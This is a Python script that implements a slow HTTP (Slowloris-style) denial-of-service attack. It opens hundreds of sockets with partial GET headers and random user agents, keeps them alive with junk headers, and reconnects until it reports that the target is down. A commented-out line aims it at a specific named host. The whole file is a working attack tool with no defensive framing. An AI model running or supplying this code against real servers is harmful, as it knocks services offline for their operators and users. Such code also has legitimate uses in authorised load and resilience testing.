#!/usr/bin/env python3
import os
import requests
import socket
import ssl
import random
import time


def create_socket(ip, port, is_https):
    """
    Create socket with HTTP header
    :param ip: Target IP address
    :param port: Target port
    :param ip: Target IP
    :param is_https: HTTPS connection setup
    :return: Returns created socket
    """
    # AF_INET = IPv4 address, SOCK_STREAM = TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Socket creation operation timeout
    s.settimeout(5)
    # If HTTPS is enabled, wrap socket and change port to 443
    if is_https == 'True':
        s = ssl.wrap_socket(s)
        port = 443
    # Add connection parameters (target IP and port)
    s.connect((ip, port))
    user_agents = []
    try:
        # Read file with user agents
        current_dir = os.path.dirname(os.path.abspath(__file__))
        file = os.path.join(current_dir, 'user-agents.txt')
        with open(file, "r", encoding="utf-8") as f:
            user_agents = f.readlines()
    except FileNotFoundError as e:
        # If file is does not exist, prepare one user agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"]
    # Add HEADER, method GET
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    # Add random user agent from list
    s.send("User-Agent: {}\r\n".format(user_agents[random.randint(0, len(user_agents) - 1)]).encode("utf-8"))
    # Add common Accept-Language (en-US)
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    # Return created socket
    return s


def launch(host, port, socket_limit, is_https):
    """
    Create socket with HTTP header
    :param host: Target host
    :param port: Target port
    :param socket_limit: Limit for creating sockets
    :param is_https: HTTPS connection setup
    :return: Returns log with server response
    """
    log = []
    created_sockets = []
    response = {'target_url': host, 'attack_type': 'Slow HTTP attack', 'port': port, 'https': is_https}
    # Convert host to socket connection format
    ip = host.replace("https://", "").replace("http://", "").replace("www.", "")
    msg = f"Attacking {ip} on port {port} with {socket_limit} sockets."
    print(msg)
    log.append(msg)
    msg = "Creating sockets..."
    print(msg)
    log.append(msg)
    # Create sockets and add them to list
    for _ in range(socket_limit):
        try:
            s = create_socket(ip, port, is_https)
        except socket.error as e:
            break
        finally:
            created_sockets.append(s)
    # Keep repeating until service is down or connection cancelled
    while True:
        try:
            # Get host connection status (max timeout is 60 seconds)
            r = requests.get(host, timeout=60)
            r.raise_for_status()
            msg = f"Sending headers... Socket count: {len(created_sockets)}"
            print(msg)
            log.append(msg)
            # Send all sockets
            for s in list(created_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error as e:
                    # Remove blocked created socket
                    created_sockets.remove(s)

            # Recreate sockets
            msg = "Sockets recreating..."
            print(msg)
            log.append(msg)
            for _ in range(socket_limit - len(created_sockets)):
                try:
                    s = create_socket(ip, port, is_https)
                    if s:
                        created_sockets.append(s)
                except socket.error as e:
                    # Log socket error
                    msg = e
                    log.append(msg)
                    break
            msg = f"Sleeping for {15} seconds..."
            print(msg)
            log.append(msg)
            # Suspend next execution
            time.sleep(15)
        # If exception occurs, attack is stopped
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError) as e:
            # Prepare log and status
            msg = f"Service is down ({e})"
            print(msg)
            log.append(msg)
            response['available'] = False
            response['log'] = log
            # Return log with server response
            return response


"""
if __name__ == "__main__":
    launch(host='http://apache1.willilazarov.cz', port=80, socket_limit=200, is_https=False)
"""
